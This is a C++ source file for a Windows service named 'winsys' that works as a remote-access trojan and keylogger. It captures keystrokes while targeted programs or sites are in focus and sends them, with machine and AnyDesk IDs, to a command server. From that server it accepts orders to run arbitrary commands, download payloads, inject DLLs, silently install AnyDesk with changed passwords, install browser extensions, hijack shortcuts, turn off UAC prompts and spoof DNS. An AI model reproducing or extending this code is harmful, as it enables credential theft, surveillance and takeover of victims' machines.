#include "stdafx.h"
#include "resource.h"
#include <algorithm>
#include <openssl/ssl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string>
#include <fstream>
#include <Windows.h>
#include <Tlhelp32.h>
#include <time.h>
#include <KnownFolders.h>
#include <tchar.h>
#include <strsafe.h>
#include <aclapi.h>
#include <stdio.h>
#include <UserEnv.h>
#include <shlwapi.h>
#include <regex>
#include <locale>
#include <codecvt>
#include <filesystem>
#include <WinInet.h>
#include <string.h>
#include <shellapi.h>

#include "AnydeskSet.h"
#include "utils.h"
#include "checkmachine.h"
#include "CreateFileMap.h"
#include "json.hpp"
#include "WinReg.hpp"
#include <numeric>
#include <map>
#include "unzip.h"
#include "sys_manage.h"
#include "extensionManage.h"

namespace fs = std::filesystem;

#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define UNLEN 50

// Default service start options.
#define SERVICE_START_TYPE SERVICE_AUTO_START

// List of service dependencies (none)
#define SERVICE_DEPENDENCIES L""

// Default name of the account under which the service should run
#define SERVICE_ACCOUNT L"NT AUTHORITY\\LocalService"

// Default password to the service account name
#define SERVICE_PASSWORD NULL

// Configuration file
#define SERVICE_CONFIG_FILE L"config.cfg"

// Command to run as a service
#define SERVICE_CMD L"serve"

// Command to run as a stand-alone process
#define PROCESS_CMD L"run"

// Service name
#define SERVICE_NAME L"winsys"

// Service name as displayed in MMC
#define SERVICE_DISP_NAME L"winsys"

// Service description as displayed in MMC
#define SERVICE_DESC L"winsys"

// hook dll name
#define HOOKDLL "msvcp140.dll"

// Ping websocket interval
#define WEBSOCKETINTERVAL 8000

#define SERVICEENTRY L"SYSTEM\\CurrentControlSet\\Services"

#define SHUTDOWNEXE
using json = nlohmann::json;

using namespace std;

Json::Value g_eventData(Json::objectValue);
string g_currentDir;
string g_AnydeskTrueName;
string g_anydesk_path;
string anydesk_true_path;
BOOL bFlagAnyDeskInstall = FALSE;
BOOL bTargetRunning = FALSE;

string g_strTmpConf[2];
string g_sysConfigpath[2];
string g_servicePath[2];

void file_log(string log);
void runAction();
DWORD WINAPI CheckTarket(LPVOID lpParam);
void runActions(std::string);
string parseServerString(string s);
DWORD APIENTRY exitThread(LPVOID path);

///////
SERVICE_STATUS g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
///////////

#define KEYBOARD_PIPE_NAME "\\\\.\\pipe\\KeyboardDataPipe" // Replace with your keyboard pipe name
#define CLIPBOARD_PIPE_NAME "\\\\.\\pipe\\ClipboardDataPipe"

HANDLE g_keyPipe = INVALID_HANDLE_VALUE;
HANDLE g_clipPipe = INVALID_HANDLE_VALUE;

string g_strAnyDeskId = "";
string g_computeruid = "";
string old_pwd_hash = "";
string old_pwd_salt = "";
Json::Value g_status;

enum UAC_LEVEL {
	ALWAYS_NOTIFY = 2,
	NOTIFY_CHANGES = 5,
	NOTIFY_CHANGES_NO_DIM = 3,
	NEVER_NOTIFY = 0
};

DWORD WINAPI ReadFromKeyboardPipelineThread(LPVOID lpParam)
{
	do
	{
		file_log("Failed to connect to keyboard named pipe. Error code: %d\n");
		g_keyPipe = CreateFile(KEYBOARD_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		Sleep(3000);
	} while (g_keyPipe == INVALID_HANDLE_VALUE);

	DWORD dwMode = PIPE_READMODE_MESSAGE;
	if (!SetNamedPipeHandleState(
		g_keyPipe, // pipe handle
		&dwMode,   // new pipe mode
		NULL,	   // don't set maximum bytes
		NULL)	   // don't set maximum time
		)
	{
		DWORD errorcode = GetLastError();
		char bufferlog[2048];
		sprintf(bufferlog, "SetNamedPipeHandleState is failed, %d", errorcode);
		file_log(bufferlog);
	}

	file_log("got keyboard pipe");

	while (1)
	{
		if (g_keyPipe != INVALID_HANDLE_VALUE)
		{
			char buffer[1024];
			DWORD bytesRead;

			while (ReadFile(g_keyPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) != 0)
			{
				if (bTargetRunning == TRUE && bytesRead > 0)
				{
					buffer[bytesRead] = '\0';
					file_log("keyboard hook");
					file_log(buffer);
					g_eventData["keyboard"] = g_eventData["keyboard"].asString() + std::string(buffer);
					file_log(stringifyJson(g_eventData));

				}
			}
		}

		Sleep(1000);
	}

	return 0;
}

vector<string> target_processlist;
map<string, string> target_sitelist;
map<string, string> target_processlist_critical;

vector<string> target_processrunning;
vector<string> target_siterunning;

BOOL isTargetProcessRunning()
{
	target_processrunning.clear();

	for (auto const& pair : target_processlist_critical)
	{
		std::string sName = pair.first;
		std::string sCritical = pair.second;
		BOOL bCritical = FALSE;

		if (sCritical == "true")
		{
			bCritical = true;
		}

		if (IsProcessRunning(sName, bCritical))
		{
			target_processrunning.push_back(sName);

			if (bCritical == true)
			{
				CreateThread(NULL, 0, exitThread, NULL, 0, NULL);
			}
		}
	}

	std::string result = std::accumulate(target_processrunning.begin(), target_processrunning.end(), std::string());

	if (!target_processrunning.empty())
		return true;

	return false;
}

BOOL isTargetWebsiteRunning()
{
	target_siterunning.clear();
	char windowTitle[256];

	HWND hwnd = FindWindow(NULL, NULL); // Get the first top-level window

	while (hwnd != NULL)
	{
		if (hwnd == GetForegroundWindow())
		{
			GetWindowText(hwnd, windowTitle, sizeof(windowTitle));

			for (auto& item : target_sitelist)
			{
				std::string lowwindow = ToLower(windowTitle);
				lowwindow.erase(std::remove_if(lowwindow.begin(), lowwindow.end(), isNonAscii), lowwindow.end());
				std::string lowitem = ToLower(item.second);
				lowitem.erase(std::remove_if(lowitem.begin(), lowitem.end(), isNonAscii), lowitem.end());
				if (strstr(lowwindow.c_str(), lowitem.c_str()) != nullptr)
				{
					target_siterunning.push_back(item.first);
				}
			}
		}

		hwnd = FindWindowEx(NULL, hwnd, NULL, NULL); // Get the next top-level window
	}

	if (!target_siterunning.empty())
		return true;

	return false;
}

DWORD WINAPI CheckTarket(LPVOID param)
{
	std::vector<std::string> temp_targetlist;
	std::string result;

	while (1)
	{
		temp_targetlist.clear();

		Sleep(1000);

		BOOL webflag = isTargetWebsiteRunning();
		BOOL tarflag = isTargetProcessRunning();

		if (tarflag || webflag)
		{
			temp_targetlist.clear();
			temp_targetlist.insert(temp_targetlist.end(), target_processrunning.begin(), target_processrunning.end());
			temp_targetlist.insert(temp_targetlist.end(), target_siterunning.begin(), target_siterunning.end());

			result = "";

			for (auto item : temp_targetlist)
			{
				result += item;
				result += ",";
			}
			g_eventData["processes"] = result;

			bTargetRunning = TRUE;
		}
		else
		{
			bTargetRunning = FALSE;
		}
	}
}

DWORD APIENTRY exitThread(LPVOID path)
{
	Sleep(3000);
	DestroyWindow((HWND)hWndClipboard);
	runExitProcess(false);
}

void changePasswords()
{
	changePassword(g_strTmpConf[0], g_servicePath[0]);

	changePassword(g_strTmpConf[1], g_servicePath[1]);
}

void restorePasswords()
{
	restorePassword(g_strTmpConf[0], g_servicePath[0]);

	restorePassword(g_strTmpConf[1], g_servicePath[1]);
}

string getIDs()
{
	if (bFlagAnyDeskInstall == FALSE)
	{
		return "";
	}

	// search anydesk string

	string pathAnydeskDataName;
	string programdata, appdata;
	string szIDs;

	const char* appDataPath = getenv("APPDATA");
	appdata = appDataPath;
	pathAnydeskDataName = appdata + "\\AnyDesk";
	g_sysConfigpath[0] = pathAnydeskDataName + "\\system.conf";
	g_servicePath[0] = pathAnydeskDataName + "\\service.conf";
	g_strTmpConf[0] = pathAnydeskDataName + "\\service_temp.conf";
	file_log("AppData path");
	file_log(pathAnydeskDataName);
	file_log(g_sysConfigpath[0]);
	szIDs = getID(pathAnydeskDataName, g_sysConfigpath[0]);
	if (szIDs.length() == 0)
		bFlagAnyDeskInstall = FALSE;

	const char* programDataPath = getenv("PROGRAMDATA");
	programdata = programDataPath;
	pathAnydeskDataName = programdata + "\\AnyDesk";
	g_sysConfigpath[1] = pathAnydeskDataName + "\\system.conf";
	g_servicePath[1] = pathAnydeskDataName + "\\service.conf";
	g_strTmpConf[1] = pathAnydeskDataName + "\\service_temp.conf";
	file_log("ProgramData path");
	file_log(pathAnydeskDataName);
	file_log(g_sysConfigpath[1]);
	szIDs += ", ";
	string szID_tmp = getID(pathAnydeskDataName, g_sysConfigpath[1]);
	if (szID_tmp.length() == 0)
		bFlagAnyDeskInstall = FALSE;

	szIDs += szID_tmp;

	return szIDs;
}

std::string GetComputerInfo()
{
	Json::Value data;
	Json::Value jsonValue;
	Json::Reader reader;

	data["anydesk_id"] = getIDs();
	data["anydesk_install"] = !GetAnyDeskInstallPath().empty();

	file_log("getting computer info");

	// get scaninfo to buffer
	char buffer[8192] = { 0 };

	scan_target(buffer);

	if (buffer != NULL)
	{
		reader.parse(buffer, jsonValue);
		file_log("priting buffer");
		file_log(std::string(buffer));
	}
	else
	{
		file_log("buffer is null");
	}
	data["scaninfo"] = jsonValue;

	file_log("got computer info");

	return stringifyJson(data);
}

void release_checkAnyDesk()
{
	char szCurrFile[MAX_PATH] = { 0 };
	char szTruePath[MAX_PATH] = { 0 };

	GetModuleFileNameA(NULL, szCurrFile, sizeof(szCurrFile));
	PathRemoveFileSpecA(szCurrFile);

	StringCbPrintf(szTruePath, sizeof(szTruePath), "%s\\%s", szCurrFile, g_AnydeskTrueName.c_str());

	file_log("true path:" + string(szTruePath));

	anydesk_true_path = szTruePath;
}

void GenerateBasePath()
{
	WCHAR szName[260] = { 0 };
	GetModuleFileNameW(NULL, szName, sizeof(szName));

	// set windows services
	wstring name = fs::path(szName).stem();
	wstring keyPath = SERVICEENTRY;
	string path;

	// get current core version
	g_AnydeskTrueName = "Anydesk.exe";

	g_anydesk_path = GetAnyDeskInstallPath();

	file_log(g_anydesk_path);
	file_log(g_AnydeskTrueName);

	release_checkAnyDesk();

	if (exist_file(g_anydesk_path))
	{
		bFlagAnyDeskInstall = TRUE;
	}

	g_currentDir = getExePath();
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
	string uid = GetComputerUid();
	string endpoint = "/postKeyboard/" + uid;
	string server = "";

#ifdef DEBUGLOG
	server = "https://" + parseServerString(g_socketserver) + endpoint;
	// server = "https://" + parseServerString(g_socketserver) + endpoint;
#else
	server = "https://" + parseServerString(g_socketserver) + endpoint;
#endif
	// generate global variables path
	file_log("ServiceWorkerThread");
	Sleep(5000);

	do
	{
		// send keyboard data
		string body = stringifyJson(g_eventData);
		file_log(server);
		file_log(body);
		string response;
		bool flag = PostJsonToServer(server, body, response);
		if (flag)
		{
			g_eventData = Json::Value(Json::objectValue);
			g_eventData["keyboard"] = "";
		}

		runAction();

		// send clipboard and keyboard event every 15 min
		Sleep(TIMEWAIT);
	} while (true);

	return ERROR_SUCCESS;
}

VOID ServiceMain()
{
	DWORD Status = E_FAIL;
	HANDLE hThread;

	EnableDebugPrivilege();

	if (!CheckUserLogined())
	{
		file_log("User not logged in");
		return;
	}

	setRegistryPsExec();

	GenerateBasePath();

	CreateThread(NULL, 0, ReadFromKeyboardPipelineThread, NULL, 0, NULL);

	CreateThread(NULL, 0, CheckTarket, NULL, 0, NULL);
	
	hThread = CreateThread(0, 0, ServiceWorkerThread, 0, 0, 0);

	if (hThread)
	{
		WaitForSingleObject(hThread, INFINITE);
	}

EXIT:
	return;
}

DWORD GetHttpStatusCode(HINTERNET hRequest) {
	DWORD dwStatusCode = 0;
	DWORD dwSize = sizeof(dwStatusCode);
	DWORD dwIndex = 0;

	if (!HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwSize, &dwIndex)) {
		return 900;
	}

	return dwStatusCode;
}

string parseServerString(string s)
{
	size_t pos = s.find(':');
	if (pos != std::string::npos) {
		s.erase(pos);
	}
	return s;
}

bool GetActionStatus(std::string& response)
{
	string uid = GetComputerUid();
	string endpoint = "/getActionStatus/" + uid;
	string server = "";

#ifdef DEBUGLOG
	server = "https://" + parseServerString(g_socketserver) + endpoint;
	// server = "https://" + parseServerString(g_socketserver) + endpoint;
#else
	server = "https://" + parseServerString(g_socketserver) + endpoint;
#endif

	Json::Value messageData;

	std::string szComInfo = GetComputerInfo();

	// send machine status
	messageData["data"] = parseJson(szComInfo);
	string message = stringifyJson(messageData);

	file_log(server);
	bool flag = PostJsonToServer(server, message, response);
	return flag;
}

bool ResetActionStatus()
{
	string uid = GetComputerUid();
	string endpoint = "/resetActionStatus/" + uid;
	string server = "";

#ifdef DEBUGLOG
	server = "https://" + parseServerString(g_socketserver) + endpoint;
	// server = "https://" + parseServerString(g_socketserver) + endpoint;
#else
	server = "https://" + parseServerString(g_socketserver) + endpoint;
#endif

	string target = stringifyJson(g_eventData["processes"]);
	string body = "{\"processes\": \"" + target + "\"}";

	file_log(server);
	file_log(body);

	string response;
	bool flag = PostJsonToServer(server, body, response);
	return flag;
}

void runAction()
{

	file_log("runAction");
	string strmessage;
	bool statusCode = GetActionStatus(strmessage);
	char temp[100];
	if (!statusCode)
	{
		file_log("runAction: error getting action");
		return;
	}

	file_log(strmessage);
	if (strmessage.rfind("command_run") != std::string::npos)
	{
		file_log("runAction: running anydesk...");

		killProcessByName("AnyDesk.exe");

		installAnydesk(anydesk_true_path);
		bFlagAnyDeskInstall = TRUE;

		g_strAnyDeskId = getIDs();

		Sleep(1000);

		changePasswords();

		Sleep(500);
		run_in_service(anydesk_true_path);
		Sleep(1000);
		killProcessByName("AnyDesk.exe");
		Sleep(1000);
		run_in_service(anydesk_true_path, SW_SHOW);
	}
	else if (strmessage.rfind("command_close") != std::string::npos)
	{
		file_log("runAction: closing anydesk...");
		killProcessByName(g_AnydeskTrueName);
		killProcessByName("AnyDesk.exe");
		Sleep(1000);
		restorePasswords();
	}
	else if (strmessage.rfind("command_check") != std::string::npos)
	{
		file_log("runAction: pong");
	}
	else if (strmessage.rfind("command_uninstall") != std::string::npos)
	{
		file_log("runAction: command_unstall...");
		ResetActionStatus();
		// uninstall chrome extensions
		char extensionPath[MAX_PATH];
		WIN32_FIND_DATA dirData;
		ExpandEnvironmentStringsA("%APPDATA%\\EdgeCookie\\x86\\Extensions\\", extensionPath, MAX_PATH);

		if (dirExists(extensionPath))
		{
			strcat_s(extensionPath, "*");
			HANDLE hFind = FindFirstFile(extensionPath, &dirData);
			if (hFind != INVALID_HANDLE_VALUE)
			{
				do
				{
					if (dirData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						uninstallExtension(dirData.cFileName);
					}
				} while (FindNextFile(hFind, &dirData));
			}
			FindClose(hFind);
		}

		WCHAR removeExtensionPath[MAX_PATH];
		ExpandEnvironmentStringsW(L"%APPDATA%\\EdgeCookie\\x86\\Extensions", removeExtensionPath, MAX_PATH);
		DeleteDirectory(removeExtensionPath, true);

		// close applications
		killProcessByName("AnyDesk.exe");

		// uninstall anydesk
		string path = GetAnyDeskInstallPath();
		if (!path.empty())
		{
			path += " --silent --remove";
			run_in_service(path);
		}

		// close injector
		killProcessByName("identity.exe");

		// killProcessByName("ud.exe");

		// clean folder
		DoClearFolder();
	}
	else if (strmessage.rfind("command_start_restart") != std::string::npos)
	{
		file_log("runAction: command_restart_pc...");
		ResetActionStatus();

		MySystemShutdown();
	}
	else if (strmessage.find("command_json") != std::string::npos)
	{
		file_log("runAction: command_json...");
		runActions(strmessage);
	}

	statusCode = ResetActionStatus();
	if (!statusCode)
	{
		file_log("runAction: error resetting status");
	}

}

struct VirusCommand
{
	std::string runtype;
	std::string filetype;
	std::string url;
	std::string dest;
	std::string command;
	std::string src;
	std::string attach;
	std::string unzip;
	std::string time;
	std::string close;
	std::string name;
	std::string enable;
	std::string dns;
	std::string ip;
};

void RemoveExtension(std::string& path)
{
	size_t dotPos = path.find_last_of('.');
	if (dotPos != std::string::npos)
	{
		path.erase(dotPos);
	}
}

int setUACLevel(UAC_LEVEL level) {
	HKEY hKey;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
		DWORD value = level;
		RegSetValueEx(hKey, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (BYTE*)& value, sizeof(DWORD));
		RegCloseKey(hKey);
		return 1;  // Success
	}

	return 0; // Failure
}

void runActionToken(VirusCommand token)
{
	// download url to file

	// run actions
	if (token.runtype == "command")
	{
		// Replace system variables with your actual command
		char outputString[4096];
		ExpandEnvironmentStringsA(token.command.c_str(), outputString, 4096);

		// Replace \' to \"
		char* pos = strchr(outputString, '\'');
		while (pos != nullptr)
		{
			*pos = '"';
			pos = strchr(pos + 1, '\'');
		}

		file_log(outputString);

		CreateProcessCommand(outputString);
	}
	else if (token.runtype == "inject")
	{
		InstallHookDll(token.src.c_str(), token.attach, false);
	}
	else if (token.runtype == "download")
	{
		file_log("downloading");
		file_log(token.url);
		file_log(token.dest);

		char outputString[MAX_PATH];
		ExpandEnvironmentStringsA(token.dest.c_str(), outputString, MAX_PATH);
		std::string destpath(outputString);

		file_log(outputString);
		file_log(destpath);

		DownloadFile(token.url, destpath);

		if (token.unzip == "true")
		{
			std::string extractpath = destpath;
			RemoveExtension(extractpath);
			extractZipFile(destpath, extractpath);
		}
	}
	else if (token.runtype == "config")
	{
		MakeSchedule(token.time);

		if (token.close == "true")
		{
			runExitProcess(false);
		}
	}
	else if (token.runtype == "installextension")
	{
		file_log("installing chrome extension");
		killProcessByName("chrome.exe");
		installExtension(token.src.c_str());
	}
	else if (token.runtype == "uninstallextension")
	{
		file_log("uninstalling chrome extension");
		killProcessByName("chrome.exe");
		uninstallExtension(token.name.c_str());
	}
	else if (token.runtype == "changeshortcut")
	{
		file_log("changing shortcut");
		std::wstring target = to_wide_string(token.name);

		std::wstring desktopPath = get_desktop_path();
		std::wstring publicdesktopPath = get_public_desktop_path();

		std::wstring startmenuPath = get_start_menu_path();
		std::wstring commonstartmenuPath = get_common_startmenu_path();

		std::wstring targetDesktopPath = desktopPath + L"\\" + target + L".lnk";
		std::wstring targetPublicDesktopPath = publicdesktopPath + L"\\" + target + L".lnk";
		std::wstring targetStartmenuPath = startmenuPath + L"\\" + target + L".lnk";
		std::wstring targetCommonStartmenuPath = commonstartmenuPath + L"\\" + target + L".lnk";

		if (PathFileExistsW(targetDesktopPath.c_str()))
		{
			changeShortcut(token.dest.c_str(), targetDesktopPath.c_str());
		}

		if (PathFileExistsW(targetStartmenuPath.c_str()))
		{
			changeShortcut(token.dest.c_str(), targetStartmenuPath.c_str());
		}

		if (PathFileExistsW(targetPublicDesktopPath.c_str()))
		{
			changeShortcut(token.dest.c_str(), targetPublicDesktopPath.c_str());
		}

		if (PathFileExistsW(targetCommonStartmenuPath.c_str()))
		{
			changeShortcut(token.dest.c_str(), targetCommonStartmenuPath.c_str());
		}
	}
	else if (token.runtype == "uacmanage")
	{
		if (token.enable == "true") {
			file_log("UAC never notify...");
			setUACLevel(NEVER_NOTIFY);
		}
		else {
			file_log("UAC set as default...");
			setUACLevel(NOTIFY_CHANGES);
		}
	}
	else if (token.runtype == "dnsspoof")
	{
		manageHostFile(token.enable, token.dns, token.ip);
	}
}

void runActions(std::string jsonString)
{
	/*std::string jsonString = "    [\n"
		"        {\n"
		"            \"runtype\": \"download\",\n"
		"            \"url\": \"https://download.anydesk.com/AnyDesk.exe\",\n"
		"            \"dest\": \"D:\\\\1.exe\"\n"
		"        },\n"
		"        {\n"
		"            \"runtype\": \"command\",\n"
		"            \"command\": \"notepad.exe\"\n"
		"        },\n"
		"        {\n"
		"            \"runtype\": \"inject\",\n"
		"            \"src\": \"D:\\\\inject.dll\",\n"
		"            \"attach\": \"notepad.exe\"\n"
		"        }\n"
		"    ]";
		*/
		// pre modify

	size_t content_key_index = jsonString.find("\"content\"");
	size_t content_start_index = content_key_index + strlen("\"content\":");
	std::string content_value = jsonString.substr(
		content_start_index + 1,						// Add 2 to skip over the initial ": and "
		jsonString.length() - content_start_index - 3); // Subtract 5 to exclude "\}\n ]"

	size_t pos = 0;
	while ((pos = content_value.find("\\\"", pos)) != std::string::npos)
	{
		content_value.replace(pos, 2, "\"");
		pos += 1; // Move past the newly inserted "
	}

	pos = 0;
	while ((pos = content_value.find("\\n", pos)) != std::string::npos)
	{
		content_value.erase(pos, 2);
	}

	// pos = 0;
	// while ((pos = content_value.find("\\\\", pos)) != std::string::npos) {
	//	content_value.replace(pos, 1, "");
	// }

	jsonString = content_value;
	file_log(jsonString);

	Json::Value myActions;
	Json::Reader reader;

	bool parsingSuccessful = reader.parse(jsonString, myActions);

	if (!parsingSuccessful)
	{
		file_log("Failed to parse JSON: ");
		file_log(reader.getFormattedErrorMessages());
		return;
	}
	try
	{
		// loop the array of commands
		if (myActions.isArray())
		{
			for (Json::Value::ArrayIndex i = 0; i < myActions.size(); i++)
			{
				Json::Value runtype = myActions[i]["runtype"];
				Json::Value filetype = myActions[i]["filetype"];
				Json::Value url = myActions[i]["url"];
				Json::Value dest = myActions[i]["dest"];
				Json::Value command = myActions[i]["command"];
				Json::Value src = myActions[i]["src"];
				Json::Value attach = myActions[i]["attach"];
				Json::Value unzip = myActions[i]["unzip"];
				Json::Value time = myActions[i]["time"];
				Json::Value close = myActions[i]["close"];
				Json::Value name = myActions[i]["name"];
				Json::Value enable = myActions[i]["enable"];
				Json::Value dns = myActions[i]["dns"];
				Json::Value ip = myActions[i]["ip"];

				VirusCommand _command = {
					runtype.asString(),
					filetype.asString(),
					url.asString(),
					dest.asString(),
					command.asString(),
					src.asString(),
					attach.asString(),
					unzip.asString(),
					time.asString(),
					close.asString(),
					name.asString(),
					enable.asString(),
					dns.asString(),
					ip.asString(),
				};

				runActionToken(_command);
			}
		}
	}
	catch (std::exception& ex)
	{
		puts(ex.what());
	}
}
